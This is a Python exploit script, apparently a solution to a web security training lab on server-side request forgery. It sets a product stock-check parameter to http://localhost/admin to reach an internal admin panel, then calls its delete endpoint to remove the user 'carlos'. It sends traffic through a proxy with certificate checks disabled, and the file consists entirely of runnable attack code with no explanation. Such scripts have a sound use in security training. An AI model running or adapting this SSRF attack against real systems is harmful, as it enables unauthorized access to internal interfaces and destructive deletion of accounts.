# Lab: Basic SSRF against the local server
# This script changes the stock check URL to access the admin interface and deletes a user
import sys
import urllib3
import requests
import os
from dotenv import load_dotenv


load_dotenv()


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def delete_user(stock_path):
    delete_path = "/delete?username=carlos"
    data = {"stockApi": "http://localhost/admin"+delete_path}
    r = requests.post(stock_path, data=data, verify=False, proxies=proxies)

    if r.status_code == 302:
        print("(-> Attack executed with success, user deleted...")
    else:
        print("(-) Couldn't delete user")
        exit(-1)


def ssrf_to_delete_user(url):
    stock_path = url + "/product/stock"
    # Check if we have access to admin page
    data = {"stockApi": "http://localhost/admin"}
    r = requests.post(stock_path, verify=False, data=data, proxies=proxies)
    res = r.text

    if "admin" in res:
        print("(-> Access to admin page...")
        delete_user(stock_path)

    else:
        print("(-) Couldn't get admin page")
        exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> SSRF against local server example...")
    ssrf_to_delete_user(url)


if __name__ == "__main__":
    main()
